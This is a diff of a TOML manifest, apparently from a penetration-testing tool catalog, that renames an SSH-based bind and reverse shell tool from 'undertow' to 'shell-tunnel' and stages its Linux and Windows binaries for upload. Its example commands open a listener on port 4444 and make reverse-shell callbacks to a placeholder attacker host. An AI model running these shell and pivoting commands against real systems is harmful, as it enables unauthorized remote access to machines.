@@ -2,26 +2,26 @@ schema = 1
 kind = "both"
 description = "Static SSH server for bind and reverse shells with PTY, SFTP and port forwarding"
 tags = ["ssh", "shell", "pivot", "sftp", "tunnel", "linux", "windows"]
-upstream = "https://github.com/Real-Fruit-Snacks/Undertow"
+upstream = "https://github.com/Real-Fruit-Snacks/shell-tunnel"
 licence = "GPL-3.0"
 arch = "x86_64"
 examples = [
-  "undertow -l -v -p 4444",
-  "./undertow -d {lhost}:4444",
-  "undertow.exe -d {lhost}:4444",
+  "shell-tunnel -l -v -p 4444",
+  "./shell-tunnel -d {lhost}:4444",
+  "shell-tunnel.exe -d {lhost}:4444",
 ]
 
 [[command]]
-name = "undertow"
+name = "shell-tunnel"
 type = "binary"
-path = "files/undertow"
+path = "files/shell-tunnel"
 
 [[upload]]
-path = "files/undertow"
-as = "undertow"
+path = "files/shell-tunnel"
+as = "shell-tunnel"
 note = "Linux x86_64"
 
 [[upload]]
-path = "files/undertow.exe"
-as = "undertow.exe"
+path = "files/shell-tunnel.exe"
+as = "shell-tunnel.exe"
 note = "Windows x86_64"
